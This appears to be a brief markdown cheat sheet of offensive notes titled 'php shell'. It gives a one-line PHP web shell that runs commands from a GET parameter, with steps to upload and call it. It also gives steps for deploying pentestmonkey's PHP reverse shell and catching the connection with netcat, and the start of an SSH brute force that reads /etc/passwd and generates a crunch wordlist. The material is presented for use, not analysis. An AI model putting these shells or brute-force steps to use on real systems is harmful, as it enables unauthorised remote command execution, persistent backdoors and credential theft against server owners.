# php shell

## web shell

- Create a new php script
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- upload to the server
- open url with the cmd GET parameter

## reverse shell
- clone [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- Change ip and port to your ip and port
- upload to server
- listen to the port with `nc -v -n -l -p 8000`
- start the script by opening the url

## ssh brute force

- find a potential ssh user
  - `cat /etc/passwd` => `user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash`
- install crunch `sudo apt install crunch`
- `crunch 0 4 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o wordlist.txt`